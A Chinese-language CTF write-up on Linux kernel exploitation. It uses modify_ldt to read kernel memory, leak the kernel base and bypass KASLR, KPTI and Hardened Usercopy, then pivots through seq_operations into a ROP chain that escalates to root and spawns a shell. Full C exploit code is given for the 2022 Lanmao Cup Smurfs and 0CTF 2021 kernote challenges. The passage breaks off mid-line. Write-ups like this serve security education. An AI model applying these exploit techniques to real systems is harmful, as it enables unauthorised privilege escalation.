down_read(&amp;mm-&gt;context.ldt_usr_sem);    if (!mm-&gt;context.ldt) &#123;        retval = 0;        goto out_unlock;    &#125;    if (bytecount &gt; LDT_ENTRY_SIZE * LDT_ENTRIES)        bytecount = LDT_ENTRY_SIZE * LDT_ENTRIES;    entries_size = mm-&gt;context.ldt-&gt;nr_entries * LDT_ENTRY_SIZE;    if (entries_size &gt; bytecount)        entries_size = bytecount;    if (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;        retval = -EFAULT;        goto out_unlock;    &#125;    if (entries_size != bytecount) &#123;        /* Zero-fill the rest and pretend we read bytecount bytes. */        if (clear_user(ptr + entries_size, bytecount - entries_size)) &#123;            retval = -EFAULT;            goto out_unlock;        &#125;    &#125;    retval = bytecount;    out_unlock:    up_read(&amp;mm-&gt;context.ldt_usr_sem);    return retval;&#125;\n\n在read_ldt函数中可以看到这里有一个copy_to_user函数，可以看到如果我们可以控制mm-&gt;context.ldt-&gt;entries那我们即可实现任意地址的读取\nstatic int write_ldt(void __user *ptr, unsigned long bytecount, int oldmode)&#123;    struct mm_struct *mm = current-&gt;mm;    struct ldt_struct *new_ldt, *old_ldt;    unsigned int old_nr_entries, new_nr_entries;    struct user_desc ldt_info;    struct desc_struct ldt;    int error;    error = -EINVAL;    if (bytecount != sizeof(ldt_info))        goto out;    error = -EFAULT;    if (copy_from_user(&amp;ldt_info, ptr, sizeof(ldt_info)))        goto out;    error = -EINVAL;    if (ldt_info.entry_number &gt;= LDT_ENTRIES)        goto out;    if (ldt_info.contents == 3) &#123;        if (oldmode)            goto out;        if (ldt_info.seg_not_present == 0)            goto out;    &#125;    if ((oldmode &amp;&amp; !ldt_info.base_addr &amp;&amp; !ldt_info.limit) ||        LDT_empty(&amp;ldt_info)) &#123;        /* The user wants to clear the entry. */        memset(&amp;ldt, 0, sizeof(ldt));    &#125; else &#123;        if (!ldt_info.seg_32bit &amp;&amp; !allow_16bit_segments()) &#123;            error = -EINVAL;            goto out;        &#125;        fill_ldt(&amp;ldt, &amp;ldt_info);        if (oldmode)            ldt.avl = 0;    &#125;    if (down_write_killable(&amp;mm-&gt;context.ldt_usr_sem))        return -EINTR;    old_ldt       = mm-&gt;context.ldt;    old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : 0;    new_nr_entries = max(ldt_info.entry_number + 1, old_nr_entries);    error = -ENOMEM;    new_ldt = alloc_ldt_struct(new_nr_entries);    if (!new_ldt)        goto out_unlock;    if (old_ldt)        memcpy(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);    new_ldt-&gt;entries[ldt_info.entry_number] = ldt;    finalize_ldt_struct(new_ldt);    /*\t * If we are using PTI, map the new LDT into the userspace pagetables.\t * If there is already an LDT, use the other slot so that other CPUs\t * will continue to use the old LDT until install_ldt() switches\t * them over to the new LDT.\t */    error = map_ldt_struct(mm, new_ldt, old_ldt ? !old_ldt-&gt;slot : 0);    if (error) &#123;        /*\t\t * This only can fail for the first LDT setup. If an LDT is\t\t * already installed then the PTE page is already\t\t * populated. Mop up a half populated page table.\t\t */        if (!WARN_ON_ONCE(old_ldt))            free_ldt_pgtables(mm);        free_ldt_struct(new_ldt);        goto out_unlock;    &#125;    install_ldt(mm, new_ldt);    unmap_ldt_struct(mm, old_ldt);    free_ldt_struct(old_ldt);    error = 0;    out_unlock:    up_write(&amp;mm-&gt;context.ldt_usr_sem);    out:    return error;&#125;\n\n可以看到最后会将新的ldt放到mm中，然后释放掉旧的ldt，这里主要需要注意的是如何生存一个新的ldt，可以看到是调用了alloc_ldt_struct函数\nstatic struct ldt_struct *alloc_ldt_struct(unsigned int num_entries)&#123;    struct ldt_struct *new_ldt;    unsigned int alloc_size;    if (num_entries &gt; LDT_ENTRIES)        return NULL;    new_ldt = kmalloc(sizeof(struct ldt_struct), GFP_KERNEL_ACCOUNT);    if (!new_ldt)        return NULL;    BUILD_BUG_ON(LDT_ENTRY_SIZE != sizeof(struct desc_struct));    alloc_size = num_entries * LDT_ENTRY_SIZE;    /*\t * Xen is very picky: it requires a page-aligned LDT that has no\t * trailing nonzero bytes in any page that contains LDT descriptors.\t * Keep it simple: zero the whole allocation and never allocate less\t * than PAGE_SIZE.\t */    if (alloc_size &gt; PAGE_SIZE)        new_ldt-&gt;entries = __vmalloc(alloc_size, GFP_KERNEL_ACCOUNT | __GFP_ZERO);    else        new_ldt-&gt;entries = (void *)get_zeroed_page(GFP_KERNEL_ACCOUNT);    if (!new_ldt-&gt;entries) &#123;        kfree(new_ldt);        return NULL;    &#125;    /* The new LDT isn&#x27;t aliased for PTI yet. */    new_ldt-&gt;slot = -1;    new_ldt-&gt;nr_entries = num_entries;    return new_ldt;&#125;\n\n可以看到这里，kmalloc一个ldt_struct的size\nstruct ldt_struct &#123;    /*\t * Xen requires page-aligned LDTs with special permissions.  This is\t * needed to prevent us from installing evil descriptors such as\t * call gates.  On native, we could merge the ldt_struct and LDT\t * allocations, but it&#x27;s not worth trying to optimize.\t */    struct desc_struct\t*entries;    unsigned int\t\tnr_entries;    /*\t * If PTI is in use, then the entries array is not mapped while we&#x27;re\t * in user mode.  The whole array will be aliased at the addressed\t * given by ldt_slot_va(slot).  We use two slots so that we can allocate\t * and map, and enable a new LDT without invalidating the mapping\t * of an older, still-in-use LDT.\t *\t * slot will be -1 if this LDT doesn&#x27;t have an alias mapping.\t */    int\t\t\tslot;&#125;;\n\n这里其实可以ldt_struct的size为0x10，那么这里的利用思路是\n\n通过write_ldt控制ldt结构体\n利用read_ldt进行爆破\n\n这里为什么使用爆破呢？可以看到在copy_to_user的过程中如果并没有完成的话时会返回一个负数，那么我们可以通过这一方法来爆破出内核地址。\n例题演示2022 蓝帽杯 半决赛 Smurfsqemu-system-x86_64 \\    -m 512M \\    -kernel ./bzImage \\    -initrd ./rootfs.cpio \\    -monitor /dev/null \\    -append &quot;root=/dev/ram console=ttyS0 oops=panic quiet panic=1 kaslr&quot; \\    -cpu kvm64,+smep\\    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\    -nographic \\    -no-reboot \\    -s\n\n首先题目开启的保护只是smep和kaslr\n题目分析__int64 __fastcall kernel_ioctl(file *file, unsigned int cmd, unsigned __int64 arg)&#123;    __int64 v3; // rdx    __int64 result; // rax    int size; // r13d    __int64 v6; // rax    char *v7; // rbx    char *buf; // r14    __int64 v9; // rax    char *v10; // r12    __int64 v11; // r14    __int64 buf_low; // r13    add_args a1; // [rsp+0h] [rbp-48h] BYREF    __int64 v14; // [rsp+10h] [rbp-38h]    unsigned __int64 v15; // [rsp+18h] [rbp-30h]    ((void (__fastcall *)(file *, unsigned int, unsigned __int64))_fentry__)(file, cmd, arg);    v15 = __readgsqword(0x28u);    result = 0LL;    switch ( cmd )    &#123;        case &#x27;0&#x27;:            if ( !copy_from_user(&amp;a1, v3, 8LL) )            &#123;                if ( LODWORD(a1.size) &lt;= 2 &amp;&amp; addrList[LODWORD(a1.size)] )                    kfree();                return 0LL;            &#125;            return -22LL;        case &#x27;P&#x27;:            if ( !copy_from_user(&amp;a1, v3, 0x18LL) )            &#123;                if ( LODWORD(a1.size) &lt;= 2 )                &#123;                    v10 = addrList[LODWORD(a1.size)];                    if ( v10 )                    &#123;                        if ( LODWORD(a1.buf) &lt;= 8 )                        &#123;                            v11 = v14;                            buf_low = LODWORD(a1.buf);                            _check_object_size(addrList[LODWORD(a1.size)], LODWORD(a1.buf), 0LL);                            copy_from_user(v10, v11, buf_low);                            return 0LL;                        &#125;                    &#125;                &#125;                return 0LL;            &#125;            return -22LL;        case &#x27; &#x27;:            if ( !copy_from_user(&amp;a1, v3, 0x10LL) )            &#123;                size = a1.size;                if ( LODWORD(a1.size) &lt;= 0x20 )                &#123;                    v6 = _kmalloc(a1.size, 0xCC0LL);                    v7 = (char *)v6;                    if ( v6 )                    &#123;                        buf = a1.buf;                        if ( size &lt; 0 )                            BUG();                        _check_object_size(v6, (unsigned int)size, 0LL);                        if ( !copy_from_user(v7, buf, (unsigned int)size) )                        &#123;                            if ( !addrList[0] )                            &#123;                                v9 = 0LL;                                goto LABEL_17;                            &#125;                            v9 = 1LL;                            if ( !addrList[1] )                            &#123;                                LABEL_17:                                addrList[v9] = v7;                                return 0LL;                            &#125;                        &#125;                    &#125;                &#125;                return 0LL;            &#125;            return -22LL;    &#125;    return result;&#125;\n\n在ioctl函数存在三个功能，可以看到存在明显的UAF，但是在create时只能create两个堆块来使用，并且题目没有从内核读取数据到用户态的方法。\n利用过程那么根据上面所说的modify_ldt的利用原理来看，我们如果存在一个0x10大小的object，我们是可以控制到ldt_struct的，在write_ldt函数要想顺利的执行到下面我们还需要控制一下user_desc结构体。\ndesc.base_addr = 0xff0000;desc.entry_number = 0x1000 / 8;desc.limit = 0;desc.seg_32bit = 0;desc.contents = 0;desc.read_exec_only = 0;desc.limit_in_pages = 0;desc.seg_not_present = 0;desc.useable = 0;desc.lm = 0;\n\n当执行完write_ldt函数后，ldt_struct是我们可控的了，所以我们需要考虑泄露地址。\n========================================================================================================================    Start addr    |   Offset   |     End addr     |  Size   | VM area description========================================================================================================================                  |            |                  |         | 0000000000000000 |    0       | 00007fffffffffff |  128 TB | user-space virtual memory, different per mm__________________|____________|__________________|_________|___________________________________________________________                  |            |                  |         | 0000800000000000 | +128    TB | ffff7fffffffffff | ~16M TB | ... huge, almost 64 bits wide hole of non-canonical                  |            |                  |         |     virtual memory addresses up to the -128 TB                  |            |                  |         |     starting offset of kernel mappings.__________________|____________|__________________|_________|___________________________________________________________                                                            |                                                            | Kernel-space virtual memory, shared between all processes:____________________________________________________________|___________________________________________________________                  |            |                  |         | ffff800000000000 | -128    TB | ffff87ffffffffff |    8 TB | ... guard hole, also reserved for hypervisor ffff880000000000 | -120    TB | ffff887fffffffff |  0.5 TB | LDT remap for PTI ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base) ffffc88000000000 |  -55.5  TB | ffffc8ffffffffff |  0.5 TB | ... unused hole ffffc90000000000 |  -55    TB | ffffe8ffffffffff |   32 TB | vmalloc/ioremap space (vmalloc_base) ffffe90000000000 |  -23    TB | ffffe9ffffffffff |    1 TB | ... unused hole ffffea0000000000 |  -22    TB | ffffeaffffffffff |    1 TB | virtual memory map (vmemmap_base) ffffeb0000000000 |  -21    TB | ffffebffffffffff |    1 TB | ... unused hole ffffec0000000000 |  -20    TB | fffffbffffffffff |   16 TB | KASAN shadow memory__________________|____________|__________________|_________|____________________________________________________________                                                            |                                                            | Identical layout to the 56-bit one from here on:____________________________________________________________|____________________________________________________________                  |            |                  |         | fffffc0000000000 |   -4    TB | fffffdffffffffff |    2 TB | ... unused hole                  |            |                  |         | vaddr_end for KASLR fffffe0000000000 |   -2    TB | fffffe7fffffffff |  0.5 TB | cpu_entry_area mapping fffffe8000000000 |   -1.5  TB | fffffeffffffffff |  0.5 TB | ... unused hole ffffff0000000000 |   -1    TB | ffffff7fffffffff |  0.5 TB | %esp fixup stacks ffffff8000000000 | -512    GB | ffffffeeffffffff |  444 GB | ... unused hole ffffffef00000000 |  -68    GB | fffffffeffffffff |   64 GB | EFI region mapping space ffffffff00000000 |   -4    GB | ffffffff7fffffff |    2 GB | ... unused hole ffffffff80000000 |   -2    GB | ffffffff9fffffff |  512 MB | kernel text mapping, mapped to physical address 0 ffffffff80000000 |-2048    MB |                  |         | ffffffffa0000000 |-1536    MB | fffffffffeffffff | 1520 MB | module mapping space ffffffffff000000 |  -16    MB |                  |         |    FIXADDR_START | ~-11    MB | ffffffffff5fffff | ~0.5 MB | kernel-internal fixmap range, variable size and offset ffffffffff600000 |  -10    MB | ffffffffff600fff |    4 kB | legacy vsyscall ABI ffffffffffe00000 |   -2    MB | ffffffffffffffff |    2 MB | ... unused hole__________________|____________|__________________|_________|___________________________________________________________\n\n这里考虑搜索物理地址直接映射区\n\n物理地址直接映射区即 direct mapping area，即线性映射区（不是线代那个线性映射），这块区域的线性地址到物理地址空间的映射是连续的，kmalloc 便从此处分配内存\n而 vmalloc 则从 vmalloc/ioremap space 分配内存，起始地址为 vmalloc_base，这一块区域到物理地址间的映射是不连续的\n\n这一块区域的起始地址称之为 page_offset_base，其地址为 0xffff888000000000，我们从这个地址开始搜索即可\n因为在read_ldt函数中如果copy_to_user出现问题就会返回负数，所以我们可以利用这种方式来进行爆破。\nwhile (1)&#123;    edit(0, 0x8, buf);    int ret = syscall(SYS_modify_ldt, 0, tmp, 8);    if (ret &lt; 0)    &#123;        addr += 0x40000000;        *(uint64_t *)buf = addr;        continue;    &#125;    printf(&quot;page_offset_base: %p\\n&quot;, addr);    break;&#125;\n\n在那道page_offset_base之后我们可以尝试泄露dir的值，在距离page_offset_base不远处会出现一个指向kernel_base+0x40的指针，所以可以泄漏出内核的基地址\nwhile (1)&#123;    create(0x50, buf);    edit(0, 0x8, buf);    syscall(SYS_modify_ldt, 0, info, 0x1000);    for (int i = 0; i &lt; 0x1000 / 8; i++)    &#123;        if (info[i] &gt; vmlinux_base &amp;&amp; (info[i] &amp; 0xfff) == 0x040)        &#123;            kernel_base = info[i] - 0x40;            kernel_offset = kernel_base - vmlinux_base;            printf(&quot;\\033[32m\\033[1m[+] Found kernel base: \\033[0m%p\\n&quot;, kernel_base);            printf(&quot;\\033[32m\\033[1m[+] Kernel offset: \\033[0m%p\\n&quot;, kernel_offset);        &#125;    &#125;    if (kernel_base)    &#123;        break;    &#125;    search_addr += 0x1000;    *(unsigned long long *)buf = search_addr;&#125;\n\n泄露完地址之后，就是想办法提升权限了。可以看出来这里并不存在任意地址写，所以思路还是栈迁移随后ROP，这里就需要利用到另一个结构体了\nstruct seq_operations &#123;    void * (*start) (struct seq_file *m, loff_t *pos);    void (*stop) (struct seq_file *m, void *v);    void * (*next) (struct seq_file *m, void *v, loff_t *pos);    int (*show) (struct seq_file *m, void *v);&#125;;\n\n这个结构体的大小位0x20也满足题目所给的范围，当我们复写了start指针之后调用read就会call start指针控制rip并且此时的rax等于我们的，所以我们可以使用下面这个gadget来劫持rsp。\nxchg eax,esp\n\n这里没有办法将prepare_kernel_cred的返回值给到rdi，所以这里使用的是另一种方式，在内核当中有一个特殊的 cred —— init_cred，这是 init 进程的 cred，因此其权限为 root，且该 cred 并非是动态分配的，因此当我们泄露出内核基址之后我们也便能够获得 init_cred 的地址，那么我们就只需要执行一次 commit_creds(&amp;init_cred) 便能完成提权\nbypass kpti我对于kpti的认知就是，cr3存在相应的页表，如果，在从内核态回到用户态时没修改cr3，那么在用户态就会因为找不到对应的东西出现段错误。\n所以此时就有第一个bypass的思路，因为出现段错误肯定是有某个handle函数来处理，所以我们可以使用signal来修改信号的handle函数。\n第二种就是正常进行rop，但是中间修改一下cr3的值\n一般来说修改cr3需要的gadget是\nmov rdi,cr3or  rdi,1000hmov cr3,rdi\n\n综上，得出exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/mman.h&gt;#include &lt;signal.h&gt;#include &lt;sys/prctl.h&gt;struct create_chunk_arg&#123;    long int size;    unsigned long int buf;&#125;;struct edit_chunk_arg&#123;    long int idx;    long int size;    unsigned long int buf;&#125;;struct delete_chunk_arg&#123;    long int idx;&#125;;struct user_desc&#123;    unsigned int entry_number;    unsigned int base_addr;    unsigned int limit;    unsigned int seg_32bit : 1;    unsigned int contents : 2;    unsigned int read_exec_only : 1;    unsigned int limit_in_pages : 1;    unsigned int seg_not_present : 1;    unsigned int useable : 1;    unsigned int lm : 1;&#125;;int fd;size_t user_cs, user_ss, user_rflags, user_sp;void save_status()&#123;    __asm__(&quot;mov user_cs, cs\\n&quot;            &quot;mov user_ss, ss\\n&quot;            &quot;mov user_sp, rsp\\n&quot;            &quot;pushf\\n&quot;            &quot;pop user_rflags\\n&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;void print_hex(char *buf, int size)&#123;    int i;    puts(&quot;======================================&quot;);    printf(&quot;data :\\n&quot;);    for (i = 0; i &lt; (size / 8); i++)    &#123;        if (i % 2 == 0)        &#123;            printf(&quot;%d&quot;, i / 2);        &#125;        printf(&quot; %16llx&quot;, *(size_t *)(buf + i * 8));        if (i % 2 == 1)        &#123;            printf(&quot;\\n&quot;);        &#125;    &#125;    puts(&quot;======================================&quot;);&#125;void get_shell()&#123;    system(&quot;/bin/sh&quot;);&#125;void create(long size, unsigned long *buf)&#123;    struct create_chunk_arg arg;    arg.size = size;    arg.buf = buf;    ioctl(fd, 0x20, &amp;arg);&#125;void delete (long idx)&#123;    struct delete_chunk_arg arg;    arg.idx = idx;    ioctl(fd, 0x30, &amp;arg);&#125;void edit(long int idx, long int size, unsigned long *buf)&#123;    struct edit_chunk_arg arg;    arg.idx = idx;    arg.size = size;    arg.buf = buf;    ioctl(fd, 0x50, &amp;arg);&#125;int main()&#123;    signal(SIGSEGV, get_shell);    save_status();    char *buf[0x100];    char *tmp[0x100];    unsigned long *info = malloc(0x2000);    unsigned long vmlinux_base = 0xffffffff81000000;    memset(info, 0, 0x2000);    unsigned long kernel_base = 0;    unsigned long kernel_offset;    struct user_desc desc;    memset(buf, &quot;\\0&quot;, 0x100);    memset(buf, &#x27;a&#x27;, 0x20);    fd = open(&quot;/dev/kernelpwn&quot;, O_RDWR);    if (fd &lt; 0)    &#123;        printf(&quot;[*]Error!&quot;);        exit(0);    &#125;    create(0x10, buf);    create(0x20, buf);    delete (0);    desc.base_addr = 0xff0000;    desc.entry_number = 0x1000 / 8;    desc.limit = 0;    desc.seg_32bit = 0;    desc.contents = 0;    desc.read_exec_only = 0;    desc.limit_in_pages = 0;    desc.seg_not_present = 0;    desc.useable = 0;    desc.lm = 0;    syscall(SYS_modify_ldt, 1, &amp;desc, sizeof(desc));    unsigned long long addr = 0xffff888000000000;    *(unsigned long long *)buf = addr;    while (1)    &#123;        edit(0, 0x8, buf);        int ret = syscall(SYS_modify_ldt, 0, tmp, 8);        if (ret &lt; 0)        &#123;            addr += 0x40000000;            *(uint64_t *)buf = addr;            continue;        &#125;        printf(&quot;page_offset_base: %p\\n&quot;, addr);        break;    &#125;    unsigned long search_addr = addr;    *(unsigned long long *)buf = search_addr;    while (1)    &#123;        edit(0, 0x8, buf);        syscall(SYS_modify_ldt, 0, info, 0x1000);        for (int i = 0; i &lt; 0x1000 / 8; i++)        &#123;            if (info[i] &gt; vmlinux_base &amp;&amp; (info[i] &amp; 0xfff) == 0x040)            &#123;                kernel_base = info[i] - 0x40;                kernel_offset = kernel_base - vmlinux_base;                printf(&quot;\\033[32m\\033[1m[+] Found kernel base: \\033[0m%p\\n&quot;, kernel_base);                printf(&quot;\\033[32m\\033[1m[+] Kernel offset: \\033[0m%p\\n&quot;, kernel_offset);            &#125;        &#125;        if (kernel_base)        &#123;            break;        &#125;        search_addr += 0x1000;        *(unsigned long long *)buf = search_addr;    &#125;    unsigned long pop_rdi;    unsigned long commit_creds;    unsigned long prepare_kernel_cred;    unsigned long xchg_eax_esp;    unsigned long init_cred;    unsigned long iretq;    unsigned long swapgs;    swapgs = 0xbc889f + kernel_base;    iretq = 0x2df + kernel_base;    xchg_eax_esp = 0xffffffff810e5bb9 + kernel_offset;    pop_rdi = 0xffffffff8108c420 + kernel_offset;    commit_creds = 0xc9540 + kernel_base;    prepare_kernel_cred = 0xc99d0 + kernel_base;    init_cred = 0x1a6b700 + kernel_base;    delete (1);    int seq_fd = open(&quot;/proc/self/stat&quot;, 0);    unsigned long *fake_stack = mmap(xchg_eax_esp &amp; 0xfffff000, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);    printf(&quot;fake_stack: 0x%llx\\n&quot;, fake_stack);    fake_stack = xchg_eax_esp &amp; 0xffffffff;    printf(&quot;fake_stack: 0x%llx\\n&quot;, fake_stack);    *(unsigned long long *)buf = xchg_eax_esp;    unsigned long fake_seq_struct[0x20] = &#123;0&#125;;    fake_seq_struct[0] = xchg_eax_esp;    edit(1, 0x8, fake_seq_struct);    int i = 0;    fake_stack[i++] = pop_rdi;    fake_stack[i++] = init_cred;    fake_stack[i++] = commit_creds;    fake_stack[i++] = swapgs;    fake_stack[i++] = iretq;    fake_stack[i++] = (uint64_t)get_shell;    fake_stack[i++] = user_cs;    fake_stack[i++] = user_rflags;    fake_stack[i++] = user_sp;    fake_stack[i++] = user_ss;    read(seq_fd, 0x1234, 0x1);    return 0;&#125;\n\n可以看到我们使用的gadget只有32位，并且rax指向的还是这个gadget的地址，所以这里调用mmap的方式就按照exp中的即可\n\n如果这里使用第二种绕过kpti的话可以payload换成\nunsigned long chang_cr3 = 0xffffffff81c00feb + kernel_offset;fake_stack[i++] = pop_rdi;fake_stack[i++] = init_cred;fake_stack[i++] = commit_creds;fake_stack[i++] = chang_cr3;fake_stack[i++] = swapgs;fake_stack[i++] = iretq;fake_stack[i++] = (uint64_t)get_shell;fake_stack[i++] = user_cs;fake_stack[i++] = user_rflags;fake_stack[i++] = user_sp;fake_stack[i++] = user_ss;\n\n\n0CTF 2021 final kernote题目基本和上面一道题一致，不过这里的文件系统采用的ext4，需要拿到内部文件的方法就是\nsudo mount ./rootfs.img ./rootfs......sudo umount ./rootfs\n\n这道题目开启的保护有smep，smap，kpti以及kaslr，然后就是题目给了一个raedme文档：\nCONFIG_SLAB=yCONFIG_SLAB_FREELIST_RANDOM=yCONFIG_SLAB_FREELIST_HARDENED=yCONFIG_HARDENED_USERCOPY=yCONFIG_STATIC_USERMODEHELPER=yCONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;\n\n可以看到题目使用的堆分配算法是slab而不是默认的slub，所以需要了解一下关于slab的一些特征：\n\n开启了 Random Freelist（slab 的 freelist 会进行一定的随机化）\n开启了 Hardened Freelist（slab 的 freelist 中的 object 的 next 指针会与一个 cookie 进行异或（参照 glibc 的 safe-linking））\n开启了 Hardened Usercopy（在向内核拷贝数据时会进行检查，检查地址是否存在、是否在堆栈中、是否为 slab 中 object、是否非内核 .text 段内地址等等）\n开启了 Static Usermodehelper Path（modprobe_path 为只读，不可修改）\n\n题目分析接下来开始直接进行逆向分析驱动\nelse if ( (_DWORD)a2 == 0x6667 )&#123;    v10 = -1LL;    if ( v3 &lt;= 0xF )    &#123;        a2 = 0xCC0LL;        v8 = (unsigned __int64 *)kmem_cache_alloc_trace(kmalloc_caches[5], 0xCC0LL, 8LL, v5, -1LL);        buf[v3] = v8;        v10 = -(__int64)(v8 == 0LL);    &#125;    goto LABEL_15;&#125;\n\n首先从0x6667这个create来看，这里的kmem_cache_alloc_trace函数我在源码中找到\nstatic __always_inline __alloc_size(3) void *kmem_cache_alloc_trace(struct kmem_cache *s,                                                                    gfp_t flags, size_t size)&#123;    void *ret = kmem_cache_alloc(s, flags);    ret = kasan_kmalloc(s, ret, size, flags);    return ret;&#125;\n\n是这样定义的，只存在三个参数，第三个参数还是size，所以这里在ioctl中的create函数的size是固定的8字节\n#ifdef CONFIG_SLAB/* * The largest kmalloc size supported by the SLAB allocators is * 32 megabyte (2^25) or the maximum allocatable page order if that is * less than 32 MB. * * WARNING: Its not easy to increase this value since the allocators have * to do various tricks to work around compiler limitations in order to * ensure proper constant folding. */#define KMALLOC_SHIFT_HIGH\t((MAX_ORDER + PAGE_SHIFT - 1) &lt;= 25 ? \\\t\t\t\t(MAX_ORDER + PAGE_SHIFT - 1) : 25)#define KMALLOC_SHIFT_MAX\tKMALLOC_SHIFT_HIGH#ifndef KMALLOC_SHIFT_LOW#define KMALLOC_SHIFT_LOW\t5#endif#endif#ifdef CONFIG_SLUB/* * SLUB directly allocates requests fitting in to an order-1 page * (PAGE_SIZE*2).  Larger requests are passed to the page allocator. */#define KMALLOC_SHIFT_HIGH\t(PAGE_SHIFT + 1)#define KMALLOC_SHIFT_MAX\t(MAX_ORDER + PAGE_SHIFT - 1)#ifndef KMALLOC_SHIFT_LOW#define KMALLOC_SHIFT_LOW\t3#endif#endif#ifdef CONFIG_SLOB/* * SLOB passes all requests larger than one page to the page allocator. * No kmalloc array is necessary since objects of different sizes can * be allocated from the same page. */#define KMALLOC_SHIFT_HIGH\tPAGE_SHIFT#define KMALLOC_SHIFT_MAX\t(MAX_ORDER + PAGE_SHIFT - 1)#ifndef KMALLOC_SHIFT_LOW#define KMALLOC_SHIFT_LOW\t3#endif#endif/* Maximum allocatable size */#define KMALLOC_MAX_SIZE\t(1UL &lt;&lt; KMALLOC_SHIFT_MAX)/* Maximum size for which we actually use a slab cache */#define KMALLOC_MAX_CACHE_SIZE\t(1UL &lt;&lt; KMALLOC_SHIFT_HIGH)/* Maximum order allocatable via the slab allocator */#define KMALLOC_MAX_ORDER\t(KMALLOC_SHIFT_MAX - PAGE_SHIFT)/* * Kmalloc subsystem. */#ifndef KMALLOC_MIN_SIZE#define KMALLOC_MIN_SIZE (1 &lt;&lt; KMALLOC_SHIFT_LOW)#endif\n\n这里可以看到除了slab的最小的size为32，那么我们取出object也是从kmalloc-32中取出，并且可以看到slob和slub最小的size都是8。\n所以虽然这里create时的size是固定的但是他申请出来的object的实际大小为32请求的大小也是32。\nif ( (_DWORD)a2 == 0x6666 )&#123;    v10 = -1LL;    if ( v3 &gt; 0xF )        goto LABEL_15;    note = buf[v3];&#125;\n\n在0x6666中实现的是将buf中的object放到另一个全局变量，note中去\nif ( (_DWORD)a2 == 0x6668 )&#123;    v10 = -1LL;    if ( v3 &lt;= 0xF )    &#123;        v9 = buf[v3];        if ( v9 )        &#123;            kfree(v9, a2, v4, v5, -1LL);            v10 = 0LL;            buf[v3] = 0LL;        &#125;    &#125;    goto LABEL_15;&#125;\n\n这里很明显的就是free，并且是非常明显的UAF\nif ( (_DWORD)a2 == 0x6669 )&#123;    v10 = -1LL;    if ( note )    &#123;        *note = v3;        v10 = 0LL;    &#125;    goto LABEL_15;&#125;\n\n这里就是修改，但是值可以修改前8bit。这里题目其实还有一个选项，不过没什么用就不做解释了。\n利用分析相信提到这里就很清楚思路跟上面那道题基本是一致的了，因为最小size是32那也就决定了ldt_struct和seq_operations申请的size也都是32。\nwhile (1)&#123;    edit(*(unsigned long *)buf);    int ret = syscall(SYS_modify_ldt, 0, tmp, 8);    if (ret &lt; 0)    &#123;        addr += 0x40000000;        *(uint64_t *)buf = addr;        continue;    &#125;    printf(&quot;page_offset_base: %p\\n&quot;, addr);    break;&#125;unsigned long search_addr = addr;*(unsigned long long *)buf = search_addr;while (1)&#123;    edit(*(unsigned long *)buf);    syscall(SYS_modify_ldt, 0, info, 0x1000);    for (int i = 0; i &lt; 0x1000 / 8; i++)    &#123;        if (info[i] &gt; vmlinux_base &amp;&amp; (info[i] &amp; 0xfff) == 0x040)        &#123;            kernel_base = info[i] - 0x40;            kernel_offset = kernel_base - vmlinux_base;            printf(&quot;\\033[32m\\033[1m[+] Found kernel base: \\033[0m%p\\n&quot;, kernel_base);            printf(&quot;\\033[32m\\033[1m[+] Kernel offset: \\033[0m%p\\n&quot;, kernel_offset);        &#125;    &#125;    if (kernel_base)    &#123;        break;    &#125;    search_addr += 0x1000;    *(unsigned long long *)buf = search_addr;&#125;\n\n这里是单纯使用上一道题目方法的代码\n可以看到在下面搜索基地址，会直接崩溃掉，这是因为触发了Hardened Usercopy保护。在fork的系统调用中存在一条调用链：\nsys_fork()=&gt;kernel_clone()=&gt;copy_process()=&gt;copy_mm()=&gt;dup_mm()=&gt;dup_mmap()=&gt;arch_dup_mmap()=&gt;ldt_dup_context()\n最后的ldt_dup_context函数如下：\nint ldt_dup_context(struct mm_struct *old_mm, struct mm_struct *mm)&#123;    struct ldt_struct *new_ldt;    int retval = 0;    if (!old_mm)        return 0;    mutex_lock(&amp;old_mm-&gt;context.lock);    if (!old_mm-&gt;context.ldt)        goto out_unlock;    new_ldt = alloc_ldt_struct(old_mm-&gt;context.ldt-&gt;nr_entries);    if (!new_ldt) &#123;        retval = -ENOMEM;        goto out_unlock;    &#125;    memcpy(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);    finalize_ldt_struct(new_ldt);    retval = map_ldt_struct(mm, new_ldt, 0);    if (retval) &#123;        free_ldt_pgtables(mm);        free_ldt_struct(new_ldt);        goto out_unlock;    &#125;    mm-&gt;context.ldt = new_ldt;    out_unlock:    mutex_unlock(&amp;old_mm-&gt;context.lock);    return retval;&#125;\n\n可以看到中间存在一条memcpy函数是将父进程的ldt结构体的entries指向的内容拷贝到子进程ldt结构体的entries指针指向的位置。这样避免了把dir直接copy_to_user给用户态，这里memcpy都是在内核态进行的，所以也就避免了Hardened Usercopy保护。所以这里应该改为：\npipe(pipe_fd);while (1)&#123;    edit(*(unsigned long *)buf);    if (!fork())    &#123;        syscall(SYS_modify_ldt, 0, info, 0x1000);        for (int i = 0; i &lt; 0x1000 / 8; i++)        &#123;            if (info[i] &gt; vmlinux_base &amp;&amp; (info[i] &amp; 0xfff) == 0x040)            &#123;                kernel_base = info[i] - 0x40;                kernel_offset = kernel_base - vmlinux_base;                printf(&quot;\\033[32m\\033[1m[+] Found kernel base: \\033[0m%p\\n&quot;, kernel_base);                printf(&quot;\\033[32m\\033[1m[+] Kernel offset: \\033[0m%p\\n&quot;, kernel_offset);            &#125;        &#125;        write(pipe_fd[1], 